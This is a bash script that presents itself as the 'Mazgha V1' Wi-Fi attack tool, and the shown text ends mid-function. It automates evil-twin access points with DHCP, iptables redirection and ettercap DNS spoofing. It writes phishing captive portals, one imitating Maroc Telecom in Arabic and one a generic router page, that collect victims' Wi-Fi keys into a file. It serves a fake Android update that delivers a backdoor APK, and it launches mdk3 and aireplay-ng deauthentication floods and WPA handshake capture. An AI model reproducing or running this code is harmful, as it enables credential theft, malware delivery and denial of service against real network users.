#TAMAZGHA
#Tested By Ubuntu || kali linux 
#ID Facebook 100009213759371
#by Yassin Mazgha006
# Colors
black='\e[0;30m'        # Black
red='\e[0;31m'          # Red
green='\e[0;32m'        # Green
purple='\e[0;35m'       # Purple
cyan='\e[0;36m'         # Cyan
white='\e[0;37m'        # White
IP="192.168.1.1"
scriptname=$(readlink -f $0)
pathfile=""
dhcpserver="/etc/default/isc-dhcp-server"
www="/srv/www/html/mazgha"
mon="mon0"
mazra_output="/dev/null"
pathname=`dirname $scriptname`
#groundMazgha

function backgroundmazgha(){
    echo ""
    echo "                              Mazgha V1"
    echo -e $green"    ______________________________________________________________________________" && sleep 0.028
    echo -e $green"   |                                                                              |" && sleep 0.028
    echo -e $green"   |        $white Script Mazgha ,Evil Twin $red☣️$white , Evil Update $red☣️ ,$white Evil ATTck $red☣️            $green|" && sleep 0.028
    echo -e $green"   |______________________________________________________________________________|" && sleep 0.028
    echo ""
}
if ! [ -d "/srv/www/html/mazgha" ]; then
    mkdir -p /srv/www/html/mazgha
fi
ifconwlan0=`ifconfig | grep -o "^wlan[0-9]\+" | awk '{print $1}'`
#kill Port
kill -9 $( lsof -i:4444 -t )  &>$mazra_output
#netstat -ntlp | awk '$4~/:*80$/{gsub(/\/.*/,"",$NF);cmd="kill -9 "$NF;system(cmd)}' &>$mazra_output
clear
function fakehtmlupdate()
{
#You can Edit Page index ;) Windows ....
echo '<html><head><title>
</title><meta charset=utf-8><style>.androsize{color:#fff;display:nones;font-size:50px;text-align:center;}body{background:red}.bodyfuck{display:none;} @media (max-width:1000px){*{padding:0;margin:0;}body{background:#fff;}.androsize{display:none;}
.toppmen{background:#006eb9;overflow:auto;}.bodyfuck{display:block;}.titlemen{color:#fff;position:relative;text-align:center;top:70px;font-size:60px;right:111px;}.martelelog{float:right;width:300px;position:relative;bottom:44px;right:60px;}.contenttext{margin:30px auto;text-align:center;overflow:auto;padding:20px;}.bordertexer{border:1px solid #d35400;text-align:center;color:#fff;padding:20px;font-size:50px;background:#d35400;}.bordertextermesser{border:1px solid #d35400;padding:40px;overflow:auto;box-shadow:0px 2px 7px #d35400}.imgdroid{width:400px;margin:30px auto}.alert{color:red;font-size:60px;font-weight:bold;}.pupdater{font-size:56px;width:680px;margin:auto;font-weight:bold;padding:40px;color:black}.linkdownload{color:#fff;background:#d35400;padding:30px;margin-bottom:19px;font-size:80px;}.lina{margin-top:33px;padding:12px;}}</style></head><body><span class=androsize>خاص بالاندرويد</span><div class=bodyfuck><div class=toppmen><h1 class=titlemen>Maroc telecom</h1><img class=martelelog src=DSC_3267.jpg alt=Maroc Telecom></div><div class=contenttext><div class=bordertexer><h2 class=contextr>إتصالات المغرب ترحب بكم </h2></div><div class=bordertextermesser><div class=messagetext><span class=alert> المرجو تسوية وضعية هاتفكم</span><p class=pupdater>بما أن جهازك لا يدعم الاتصال بالخادم فيرجى تحديته <br>تحديث لن يستغرق سوى 10 تواني</p></div><div class=formput><img src=android.png class=imgdroid alt=Android Logo></div><div class="lina"><form method=post action=index.php>
<input type=submit name=submite class=linkdownload value="إضغط هنا للاتصال"></form></div></div></div></div><?php if($_POST[submite]){echo "<script>window.location.href=\"update.apk\"</script>";$user=$_SERVER["HTTP_USER_AGENT"];$file=fopen("clicked.txt","w");fwrite($file,"Clicked User => ".$user."\n");}?></body></html>
' > $www/index.php
test -f "$www/clicked.txt" || touch $www/clicked.txt
cp $pathname/android.png $pathname/DSC_3267.jpg $www/
}
dosattacks()
{
while [[ $Bssid == "" ]] 
do 
    echo -en "Please input Bssid # "
    read Bssid
done
echo $Bssid > $pathname/mac &>$mazra_output
clear
echo ""
trap stopmdkdos INT &>$mazra_output
while true
	do
    ch=""
    echo -en $green"\n Connecting and check Target Channel $Bssid ... "
    while [[ $ch == "" ]]
    do
        airodump-ng --bssid ${Bssid} ${monitor} 2> $pathname/stan.txt & airodump=$!
        sleep 10
        kill $airodump &>$mazra_output
        ch=`tail $pathname/stan.txt | grep ${Bssid} | awk '{print $6}'`
        if [[ $ch == "" ]]; then
            sleep 0.2
            echo -e $red"Mazgha Can't Connected With  Target ->  ${Bssid} "
            sleep 0.3
            echo -e $green"   Target ->  ${Bssid} $red Silent !"
            sleep 0.3
            #if network ${Bssid} Stile Silent in Your Face
            echo -e $green"Change MAC address interfaces ${monitor}"
            ifconfig ${monitor} down&&macchanger  -a ${monitor}>$mazra_output 2>&1&&ifconfig ${monitor} up 
            sleep 1
            echo -en $green"    Trying to get a target AP... $cyan ${Bssid} $green... "
        else
            echo -e $green"${Bssid} is Responding ! Channel be ${ch}"
        fi
    done
    sleep 1
    echo -en "	Fuck UP ..." 
    xterm -geometry 78x19-1-300 -bg black -fg green -title "[☠] ATTACK [☠]" -e timeout 1m  mdk3 ${monitor} d -b $pathname/mac -c ${ch} &  &>$mazra_output
    xterm -geometry 129x37-230-200 -bg black -fg green -title "[☠] DiSCONNECTE [☠]" -e timeout 1m mdk3 ${monitor} a -a ${Bssid} -m & &>$mazra_output
            sleep 1
    xterm -geometry 78x19-1 -bg black -fg blue -title "[☠] SEND PAKETS [☠]" -e timeout 1m mdk3 ${monitor} m -t "${Bssid}" & &>$mazra_output
            sleep 1
    xterm -geometry 78x19-1-300 -bg black -fg green -title "[☠] ATTACK [☠]" -e timeout 1m  mdk3 ${monitor} d -b $pathname/mac -c ${ch} & &>$mazra_output
            sleep 1
    xterm -geometry 78x19-1-130 -bg black -fg green -title "[☠] DiSCONNECTE [☠]" -e timeout 1m  mdk3 ${monitor} d -b $pathname/mac -c ${channel} & &>$mazra_output
            sleep 1
    xterm -geometry 78x17-1-1 -bg black -fg green -title "[☠] SEND Pakets [☠]" -e timeout 1m mdk3 ${monitor} d -b $pathname/mac -c ${ch} & &>$mazra_output
            sleep 1
            #mon0
    xterm -geometry 78x19-400-460 -bg black -fg green -title "[☠] DiSCONNECTE [☠]" -e timeout 1m  mdk3 ${mon} d -b $pathname/mac -c ${ch} &  &>$mazra_output & &>$mazra_output
            sleep 1
    xterm -geometry 78x19-400-300 -bg black -fg green -title "[☠] ATTACK [☠]" -e timeout 1m mdk3 ${mon} b  -t "${Bssid}" -c ${ch} X & &>$mazra_output
            sleep 1
    xterm -geometry 78x19-400-1 -bg black -fg green -title "[☠] ATTACK [☠]" -e timeout 1m mdk3 ${mon} d -b $pathname/mac -c ${channel} & &>$mazra_output
            sleep 1
    xterm -geometry 78x19-400-100 -bg black -fg green -title "[☠] ATTACK [☠]" -e timeout 1m mdk3 ${monitor} b  -t "${Bssid}" -c ${ch} X & &>$mazra_output
            sleep 1
    xterm -geometry 78x19-1-300 -bg black -fg green -title "[☠] ATTACK [☠]" -e timeout 1m  mdk3 ${monitor} d -b $pathname/mac -c ${ch} & &>$mazra_output
            sleep 1
    xterm -geometry 78x19+1 -fg green -title "[☠] ATTACK Send Packs [☠]" -e timeout 1m mdk3 ${monitor} b  -t "${Bssid}" -c ${ch} X & &>$mazra_output
            sleep 1
    xterm -geometry 78x19+1+200 -fg green -title "[☠] SEND Pakets [☠]" -e timeout 1m timeout 1m mdk3 ${monitor} a -a ${Bssid} -m & &>$mazra_output
            sleep 1
    xterm -geometry 78x19+1+400 -fg green -title "[☠] Injaction [☠]" -e timeout 1m mdk3 ${monitor} a -a "${Essid}" & &>$mazra_output
            sleep 1
    xterm -geometry 78x19+1+400 -fg green -title "[☠] DiSCONNECTE [☠]" -e timeout 1m mdk3 ${monitor} d $pathname/mac -c ${ch} & &>$mazra_output
            sleep 1
    xterm -geometry 78x19+1+700 -fg green -title "[☠] DiSCONNECTE [☠]" -e timeout 1m mdk3 ${monitor} d -b $pathname/mac -c ${ch} & &>$mazra_output
    sleep 1m
done
sleep 0.1
}
#stop Attacks
function stopmdkdos(){
    echo -e $purple"\n Kill Mdk3 "
    killall mdk3 &>$mazra_output
    echo -e $purple" Kill Stan "
    killall airodump-ng &>$mazra_output
    rm $pathname/stan.txt $pathname/mac &>$mazra_output
    bash $pathname/airmon.sh stop ${mon} &>$mazra_output
    service network-manager restart
    exit
}
function stopairodump()
{
bash $pathname/airmon.sh stop ${mon} &>$mazra_output
echo "Restart Network"
service network-manager restart
exit
}
function tamazgha (){
    echo -en "$blue [$green!$blue]$green ESSID    !# $cyan " && read Essid
    sleep 0.3
    echo -en "$blue [$green!$blue]$green BSSID    !# $cyan " && read Bssid
    sleep 0.3
    echo -en "$blue [$green!$blue]$green Channel  !# $cyan " && read channel
    sleep 0.3
}
function eviltwindeflt()
{
echo '<html><head><title>Network security</title>
<style>*{padding:0;margin:0;}body{background:#7f8c8d;}.maindivtop{border:1px solid #000;color: #fff;background:#2980b9;overflow:auto;padding:12px;}.titlemess{}.routerv ,.firversion{font-size:12px;} .routerv{float:left;}.firversion{float:right;}.divnetworktext{width:90%;margin:19px auto;}.borderdivnetwork{background:#34495e;color:#fff;text-align:center;width:90%;border:1px solid #000;margin:auto;padding:7px;border-top-left-radius:8px;border-top-right-radius:8px;}.titlemess{font-size:22px;padding:5px;}.messah3{color:red;text-align:center;font-size:23;margin-top:-25;}.maindivnetworktextmain{text-align:center;border:1px solid #333;width:90%;margin:auto;padding:7px;background:#fff;overflow:auto;}.ssid{white-space:pre;float:left;clear:both;padding:3px;font-family: "Times New Roman", Times, serif;color:#000;}.essidname{overflow:auto;width:400px;margin:16px auto;position:relative;left:50px;padding:11px;z-index:999;}.lockedmage{width:200px;float:left;position:relative;top:-140px;}.border{margin-top:60px; border-bottom:1px solid #333;}.borderbotto{width:84%;margin:auto;background:#fff;}.forminput{width:80%;margin:auto;padding:11px;}
.pass{width:80%;font-size:20px;border:1px solid #3498db;border-radius:5px;padding:8px;text-align:center;margin-top:-70px;}.next{transition:0.5s;margin-top:9px;width:40%;background:#2980b9;color:#fff;font-size:25px;border-radius:8px;padding:2px;border:1px solid #2980b9}.next:hover{background:#3498db;}.enterkey{color:#fff;padding:2px;float:left;font-size:19px;margin-left:-180px;}
@media screen and (orientation:portrait){.maindivtop{height:40px;padding:11px;text-align:center;}.routerv ,.firversion{font-size:35px;}
.divnetworktext{background:#7f8c8d;width:99%;margin:90px auto;padding:6px;}.maindivnetworktextmain{width:97%;margin:auto;padding:12px;}
.borderdivnetwork{width:97%;padding:12px;border-top-left-radius:30px;border-top-right-radius:30px;}.titlemess{font-size:60px;}.ssid{font-size:50px;}.lockedmage{width:220px;top:-180px;left:-65px;}.essidname{left:-25px;z-index:999;position:relative;top:40px;width:100%;}.forminput{padding:22px;border:1px solid #333;overflow:auto;color:#333;width:90%;margin:-30px auto;}.enterkey{font-size:45px;margin-left:0px;}.pass{margin-top:19px;font-size:50px;width:97%;padding:10px;}.next{width:80%;font-size:60px;padding:11px;margin-top:22px;}.border{overflow:auto;width:96%;margin:auto;padding:28px;position:relative;top:-90px;right:13px;}.over{color:#bbb;font-size:50px;font-weight:bold;}.messah3{color:red;text-align:center;font-size:40;margin-top:-150px;}}</style></head><body><div class=bodyfuck><div class=maindivtop><h3 class=routerv>Router V3</h3><h3 class=firversion>Firmware Version 12</h3></div><div class=divnetworktext><div class=borderdivnetwork><h1 class=titlemess>Help us on network security</h1></div><div class=maindivnetworktextmain><div class=borderbotto><div class=essidname><h3 class="ssid"> Name     :  '${Essid}'</h3><h3 class="ssid"> Bssid      :  '${Bssid}'</h3><h3 class="ssid"> channel  :  '${channel}'</h3></div><img src="Locked-Router-300x259.jpg" class=lockedmage></div><div class=border style=background:#34495e;><form method=post action=index.php class=forminput><p class=enterkey>Please enter the Key of '$Essid' to follow</p><br><br><input type=password name=password class=pass placeholder="enter the Key"  required><br><input type=submit name=sub class=next value=Next></form></div></div></div></div><div class=over style=position:relative;bottom:-100px;text-align:center;font-weight:bold;>Telecommunications Services<br>copyright © 2012-2016</div>'$htmleditphp'</body></html> ' > $www/index.php
if ! [ -d "/srv/www/html/mazgha/pass" ]; then
    mkdir -p /srv/www/html/mazgha/pass
fi
test -f "$www/pass/password.txt" || touch $www/pass/password.txt
cp $pathname/Locked-Router-300x259.jpg $www/
}
function eviltwinmaroc()
{
echo '<html><head><title>
Maroc Telecom</title><meta charset=utf-8><style>*{padding:0;margin:0;}body{background:#ccc;}.heroman{background:#006eb9;overflow:auto;}.contenttext{padding:10px;}.logocom{float:right;width:130px;max-width:120px;line-height:110%;position:relative;bottom:16px;right:12px;}.titlecom{color:#fff;position:relative;text-align:center;top:30px;}.divform .namewifi{color:#d35400;font-size:20px;}.contentlcom{text-align:center;}.m7tawaressala{width:70%;margin:12px auto;padding:20px;}.divtitleressa{border:1px solid #d35400;background:#e67e22;padding:12px;border-top-left-radius:12px;border-top-right-radius:12px;}.titleressala{color:#fff;font-size:30px;}.divform{border:1px solid #d35400;padding:30px;box-shadow:0px 2px 7px #d35400;background:#fff;}
.spss{float:right;position:relative;top:20px;right:140px;}.password ,.submit {border:1px solid #d35400;padding:4px;transition:0.3s;border-radius:5px;text-align:center;}.form{margin-top:13px;}.password{width:300px;margin:4px auto;}.submit{width:200px;margin-top:12px;font-size:19px;}.messah3{margin-left:600px;margin-top:-60px;color:red}.submit:hover{background:#d35400;color:#fff;}.text-p{font-size:20px;}@media screen and (orientation:portrait){.titlecom{right:200px;top:80px;font-size:70px;}.logocom{width:800px;max-width:300px;bottom:50px;}.m7tawaressala{width:100%;}.divtitleressa{padding:30px;border-top-left-radius:0px;width:100%;margin:auto;}.titleressala{color:#fff;font-size:30px;font-size:60px;}.text-p{font-size:50px;font-weight:bold}.m7tawaressala{width:100%;}.contentlcom{text-align:none;}.divform{padding:34px;border:none;border-bottom:1px solid #d35400;box-shadow:none;height:28%;width:100%;}.heroman{width:110%;}.divform .namewifi{font-size:57px;font-weight:bold}.password{text-align:center;padding:7px;font-size:60px;width:70%;margin:22px auto;border:2px solid #d35400}.submit{padding:20;font-size:55px;width:60%;margin:19px auto;font-weight:bold;background:#d35400;color:#fff;}.spss{display:none;}.messah3{font-size:50px;float:right;color:red;margin:0;}}</style></head><body><div class=bodyfuck><div class=heroman><nav class=minuhero><h1 class=titlecom>Maroc Telecom</h1><img class=logocom src=DSC_3267.jpg alt="Maroc Telecom"></nav></div><div class=contentlcom><div class=m7tawaressala><div class=divtitleressa><h2 class=titleressala>الأمن</h2></div><div class=divform><h2 class="namewifi">'${Essid}'  إسم اشبكة </h2><div class=contenttext><p class="text-p">لأسباب أمنية إتصالات المغرب تقترح عليكم إدخال مفتاح اشبكة </p></div><form class=form method=post action=index.php><span class=spss></span><input type=password required name=password class=password placeholder="أدخل كلمة المرور"><br><input type=submit name=sub class=submit value=تأكيد></form></div></div></div></div>'$htmleditphp'</body></html>
' > $www/index.php
if ! [ -d "/srv/www/html/mazgha/pass" ]; then
    mkdir -p /srv/www/html/mazgha/pass
fi
test -f "$www/pass/password.txt" || touch $www/pass/password.txt
cp $pathname/android.png $pathname/DSC_3267.jpg $www/
}
#shutdown function
function shutdown()
{
    echo -e "$blue [$green!$blue]$white Kill $green dhcpd "
    killall dhcpd &>$mazra_output
    echo -e "$blue [$green!$blue]$white Kill $green hostapd "
    sleep 0.1
    killall hostapd &>$mazra_output
    echo -e "$blue [$green!$blue]$white Kill $green lighttpd "
    sleep 0.1
    killall lighttpd &>$mazra_output
    echo -e "$blue [$green!$blue]$white Kill $green ettercap "
    sleep 0.1
    killall ettercap &>$mazra_output
    kill ${clickid} &>$mazra_output
    kill ${mdk3pid} &>$mazra_output
    echo -e "$blue [$green!$blue]$white Kill $green ports "
    sleep 0.1
    kill `lsof -t -i:80` >$mazra_output 2>&1
    echo -e "$blue [$green!$blue]$white Remove $green File "
    sleep 0.1
    rm $www/*  >$mazra_output 2>&1
    echo "0" >/proc/sys/net/ipv4/ip_forward &>$mazra_output
    bash $pathname/airmon.sh stop $mon &>$mazra_output
    echo -e "$blue [$green!$blue]$green Restart Network "
    sleep 0.1
    service network-manager restart
}
function stopmazgha()
{
hasher && exit 
}
echo ""
backgroundmazgha
echo -e "$green Souli Mazgha V1 Wifi Evil Twin & Fake Update Backdoor"
echo -e " Copyright (c) 2017, By Yassin Mazgha006 , (100009213759371)" && echo ""
echo -e "$blue [$green+$blue]$cyan Use By Root "
sleep 0.3
function hasher()
{
rm $pathname/hashdump-* >$mazra_output 2>&1
bash $pathname/airmon.sh stop ${mon} &>$mazra_output
echo "Restart Network"
service network-manager restart && exit 
}
function clnconfig()
{
rm $pathname/hashdump-* >$mazra_output 2>&1
shutdown
exit 
}
function settnmazghaconnect(){
echo -e "$blue [$green-$blue]$cyan Config iPtables Forward"
sleep 0.3
ifconfig $monitor $IP netmask 255.255.255.0 >$mazra_output 2>&1
route add -net 192.168.1.0 netmask 255.255.255.0 gw $IP
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
iptables -A INPUT -p tcp --sport 443 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
echo "1" > /proc/sys/net/ipv4/ip_forward
#create an empty leases file
echo -e "$blue [$green+$blue]$cyan Config Dhcpd iP ..."
sleep 0.3
touch $www/dhcpd.leases
# Config DHCP
echo "authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.0 netmask 255.255.255.0 {
option broadcast-address 192.168.1.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;
range 192.168.1.100 192.168.1.250;
}" > $www/dhcpd.conf
echo -e "$blue [$green+$blue]$cyan Config Hostpad Ap ..."
sleep 0.3
# Config HostAPD
echo "interface=$monitor
driver=nl80211
ssid=$Essid
channel=$channel" > $www/hostapd.conf
echo -e "$blue [$green+$blue]$cyan Config Lighttpd WebServer ..."
sleep 0.3
# creates Lighttpd web-server
echo "server.document-root = \"$www/\"
  server.modules = (
    \"mod_access\",
    \"mod_alias\",
    \"mod_accesslog\",
    \"mod_fastcgi\",
    \"mod_redirect\",
    \"mod_rewrite\"
  )
  fastcgi.server = ( \".php\" => ((
                  \"bin-path\" => \"/usr/bin/php-cgi\",
                  \"socket\" => \"/php.socket\"
                )))
  server.port =80
  server.pid-file = \"/var/run/lighttpd.pid\"
  # server.username = \"www\"
  # server.groupname = \"www\"
  mimetype.assign = (
  \".html\" => \"text/html\",
  \".htm\" => \"text/html\",
  \".txt\" => \"text/plain\",
  \".jpg\" => \"image/jpeg\",
  \".png\" => \"image/png\",
  \".css\" => \"text/css\"
  )
  server.error-handler-404 = \"/\"
  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
  index-file.names = ( \"index.html\", \"index.php\" )
  \$SERVER[\"socket\"] == \":443\" {
        url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
  }
  #Redirect www.domain.com to domain.com
  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
        url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
  }
  " >$www/lighttpd.conf
    echo -e "$blue [$green+$blue]$cyan Switching $monitor to Channel $channel"
    sleep 0.1
    echo -e "$blue [$green+$blue]$cyan Associated with $Bssid ESSID: $Essid"
    sleep 0.1
    echo -e "$blue [$green+$blue]$cyan Enrollee MAC Address $Bssid"
    sleep 0.1
    echo -e "$blue [$green+$blue]$cyan Config Ettercap  DnS Spoof"
    sleep 0.1
    echo -e "$blue [$green+$blue]$cyan Mv File etter.dns TO /etc/ette*/"
    sleep 0.1
    echo "* A $IP" > /etc/ettercap/etter.dns
    echo -e "$blue [$green+$blue]$cyan Starting AttackeR ..."
    sleep 0.1
    echo -e "$blue [$green+$blue]$cyan Start Hostapd Fake WiFck"
    sleep 0.1
    xterm -geometry 76x20-900-0 -bg black -fg green -T Hostapd -e "hostapd $www/hostapd.conf" &
    echo -e "$blue [$green+$blue]$cyan Start Lighttpd ..."
    sleep 0.1
    kill `lsof -t -i:80` >$mazra_output 2>&1
    lighttpd -f $www/lighttpd.conf
    echo -e "$blue [$green+$blue]$cyan Config Isec-dhcpd-Server Iinterfaces wlan"
    echo "INTERFACES='wlan0'" > $dhcpserver
    echo -e "$blue [$green+$blue]$cyan Waiting To Start Dhcpd ..."
    sleep 4
    xterm -geometry 76x20-900-450 -bg black -fg green -title "[☠] AP [☠]" -T DHCP -e "dhcpd -d -f -lf "$www/dhcpd.leases" -cf "$www/dhcpd.conf" ${monitor} 2>&1" &
    if [ "$handshaker" == "nomazgha" ]
    then
        echo -e "$blue [$green+$blue]$cyan Read File PasswordText ..."
        sleep 0.3
        xterm -geometry 76x20-10-0 -bg black -fg green -T Passwordfile -e "tail -f $www/pass/password.txt $2>&1" & 
    elif [ "$attack" == "fakehtmlupdate" ]
    then
        xterm -geometry 76x20-10-0 -bg black -fg green -T Clicker -e "tail -f $www/clicked.txt $2>&1" & clickid=$!
    fi
    if [[ $attack != "eviltwindeflt" ]] || [[ $attack != "eviltwinmaroc" ]] ; then
        sleep 3
        echo -e "$blue [$green+$blue]$cyan Start Mdk3 DoSAttack ..."
        sleep 0.1
        echo ${Bssid} > mac
        xterm -geometry 76x20-10-0 -bg black -fg green -T Mdk3 -e "mdk3 ${mon} d -b $pathname/mac -c ${channel} $2>&1" & mdk3pid=$!
    fi
    echo -en "$blue [$green!$blue]$green Waiting Cline Connecte .."
    while [[  $cline == ""   ]]
    do
    cline=`tail $www/dhcpd.leases | grep 'client-hostname' | awk '{print $2}'`
    done
    echo -e "$blue [$green OK $blue]$cyan\n Start ettercap DnsSpoof"
    xterm -geometry 76x20-1-450 -bg black -fg green -T Ettetcap -e "ettercap -i $monitor -T -q -P dns_spoof -M ARP:remote /// $2>&1 " & &>$mazra_output
 if [ "$handshaker" == "nomazgha" ]; then
	echo -e "CTRL+C To Exit"
	read exiter
	shutdown && exit 1
fi
}
#check root
if [ $(whoami) != 'root' ]; then
        echo "Must be root to run $0"
        exit 1;
fi
#check tools
echo -e "$blue [$green+$blue]$cyan Check requirements Found "
sleep 0.028
if ! hash airodump-ng 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$Red airodump-ng Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan airodump-ng Found "
    sleep 0.028
fi
if ! hash macchanger 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$Red macchanger Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan macchanger Found "
    sleep 0.028
fi
sleep 0.028
if ! hash aireplay-ng 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$Red aireplay-ng Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan aireplay-ng Found "
    sleep 0.028
fi
sleep 0.028
if ! [ -f "airmon.sh" ]; then
    echo -e "$blue [$green+$blue]$Red File airmon.sh Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan airmon.sh File Found "
   sleep 0.028
fi

if ! hash mdk3 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$Red Mdk3 Nout Found "
    sleep 0.1
    exit
    else 
        echo -e "$blue [$green+$blue]$cyan Mdk3 Found "
        sleep 0.028
fi
if ! hash airmon-ng 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$red airmon-ng Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan airmon-ng Found "
    sleep 0.028
fi
if ! hash hostapd 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$red hostapd Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan hostapd Found "
    sleep 0.028
fi
if ! hash ettercap 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$red ettercap Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan ettercap Found "
    sleep 0.028
fi
if ! hash lighttpd 2>$mazra_output; then
    echo -e "$blue [$green+$blue]$red lighttpd Nout Found "
    sleep 0.028
    exit
else 
    echo -e "$blue [$green+$blue]$cyan lighttpd Found "
    sleep 0.028
fi
echo -e "$blue [$green+$blue]$cyan Waiting For searching Driver ..."
sleep 0.028
if [ "$ifconwlan0" == "" ]; then
    echo -e "$blue [$green-$blue]$red Drivers Wlan Nout Found !"
    sleep 0.028
    exit
else
    echo -e $cyan" [+]$white Driver Found ...$green"
    airmon-ng | grep wlan | awk '{print " [+]",$2," ",$4,$6}'
fi
echo -en $green "Enter Wlan $cyan#:$cyan "
read monitor
test "$monitor" == "" && clear && bash ${scriptname}
sleep 0.3
while [[ $selectatta == "" ]] ||  [[ $selectatta != "1" ]] && [[ $selectatta != "2" ]] && [[ $selectatta != "3" ]]
do
clear
backgroundmazgha
echo -e $green"Attacks !"
    echo -en "
            $red 1)$green Evil Twin   ($white Su Fast  $green)
            $red 2)$green Fake Update ($white Android Rat, Backdoor$green)
            $red 3)$green Disconnecte && Injaction && Reboot Router ($white Dont't Try in Your Router)
                        $green Disconnecte $white it's working $purple &&$green Reboot Router$white it's working ( NeuFbox ,Tenda ...)$green i don't have  idea of the Rest
    Ach#! "
    read selectatta
    case $selectatta in
        1) attack="eviltwoin" && clear
            while [[ $Handshakemazgha == "" ]] ||  [[ $Handshakemazgha != "1" ]] && [[ $Handshakemazgha != "2" ]]
            do 
            clear
            echo ""
            backgroundmazgha
                echo -en "$green Evil Twin 
                    $red 1)$green   ($white Handshake $green)
                    $red 2)$green   ($white No Handshake $green)
            Ach#!$green "
                read Handshakemazgha
                case $Handshakemazgha in
                    1) handshaker="onmazgha"
                    ;;
                    2) handshaker="nomazgha"

                    ;;
                esac
            done
            while [[ $pageindex == "" ]] ||  [[ $pageindex != "1" ]] && [[ $pageindex != "2" ]]
            do
                clear
                echo ""
                backgroundmazgha
                    echo -en "$green Web Page index
                        $red 1)$green   ($white Maroc Telecom , Arabic $green)
                        $red 2)$green   ($white Default , English $green)
                Ach#!$green "
                    read pageindex
                    case $pageindex in
                        1) attack="eviltwinmaroc"
                        ;;
                        2) attack="eviltwindeflt"
                        ;;
                    esac
            done
            ;;
        2) attack="fakehtmlupdate" 
            echo -e $red"Special for $green{$white Morocco $green}"
            exit
            echo -en "$blue [$green+$blue]$cyan Path File BackDoor # $green"
            read path
            if [ -f "$path" ]; then
                cp $path $www/update.apk
                else
                    echo -e $red "File Not Found !"
                    sleep 0.6
                    bash $scriptname
            fi
            ;;
        3) attack="dosattacks"
        ;;
    esac
done
echo -e "$blue [$green+$blue]$cyan NetWork airmon-ng Check Kill"
sleep 0.3
airmon-ng check kill &>$mazra_output && bash $pathname/airmon.sh start ${monitor} &>$mazra_output
ifconfig ${monitor} down >$mazra_output 2>&1
iwconfig ${monitor} mode monitor >$mazra_output 2>&1
ifconfig ${monitor} up >$mazra_output 2>&1
echo -e "$blue [$green-$blue]$cyan chcking For Target ..."
sleep 0.3
airodump-ng ${monitor}
trap stopairodump INT >$mazra_output 2>&1
tamazgha
trap hasher INT >$mazra_output 2>&1
while [[ ${Essid} == "" ]] || [[ $channel == "" ]]
    do
        echo -e "$blue [$green-$blue]$cyan Retray "
        sleep 0.1
        tamazgha
    done
if [[ $handshaker == "onmazgha" ]]; then
    while [[ ${Bssid} == "" ]] || [[ ${channel} == "" ]]
    do
        tamazgha
    done
    echo ${Bssid} > $pathname/mac
    xterm -geometry 78x19-1-460 -bg black -fg green -title "[☠] Get Handshake [☠]" -e airodump-ng -c ${channel} --bssid ${Bssid} -w $pathname/hashdump ${monitor} --ignore-negative-one & airodumpid=$!
    #xterm -geometry 78x19-1-300 -bg black -fg green -title "[☠] Gte Handshake [☠]" -e timeout 0.50m mdk3 ${monitor} d -b mac -c ${channel} & aireplayid=$!
    xterm -geometry 78x19-1-1 -bg black -fg green -title "[☠] Get Handshake [☠]" -e timeout 1m aireplay-ng --deauth 100 -a ${Bssid} ${monitor} --ignore-negative-one &  aireplayid=$!
    clear
    hash=""
    backgroundmazgha
    echo -en "     Try Get Handshake ...\n"
    trap stopmazgha INT >$mazra_output 2>&1
    sleep 2
    while [[ $hash == "" ]]
    do
    if ! pgrep -x "airodump-ng" > $mazra_output
    then
    sleep 5
        rm $pathname/hashdump-* >$mazra_output 2>&1
        echo "Please Don't Fuck Exit airodump . Mazgha Try Start Get Handshake"
        xterm -geometry 78x19-1-460 -bg black -fg green -title "[☠] Get Handshake [☠]" -e airodump-ng -c ${channel} --bssid ${Bssid} -w $pathname/hashdump ${monitor} --ignore-negative-one & airodumpid=$!
    fi
    if ! pgrep -x "aireplay-ng" > $mazra_output
    then
    sleep 5
        xterm -geometry 78x19-1-1 -bg black -fg green -title "[☠] Get Handshake [☠]" -e timeout 1m aireplay-ng --deauth 100 -a ${Bssid} ${monitor} --ignore-negative-one &  aireplayid=$!
    fi
    
    aireplaypidone=(`ps -ef  | grep  "aireplay-ng" | awk '{print $2}'`)
    if [[ ${aireplaypidone[1]} == "" ]]; then
	       xterm -geometry 78x19-1-1 -bg black -fg green -title "[☠] Get Handshake [☠]" -e aireplay-ng --deauth 100 -a ${Bssid} ${monitor} --ignore-negative-one &  aireplayid=$!
    fi
    if aircrack-ng $pathname/hashdump-01.cap 2> $mazra_output | grep -q "1 handshake"  || aircrack-ng $pathname/hashdump-02.cap 2> $mazra_output | grep -q "1 handshake" ; then
        echo -e $green"[$white OK $green]"
        kill $airodumpid $aireplayid  >$mazra_output 2>&1 
        hash="ys"
        echo -en $green " Please Wait ...\n"
        if [[ $attack == "eviltwinmaroc" ]]; then
        
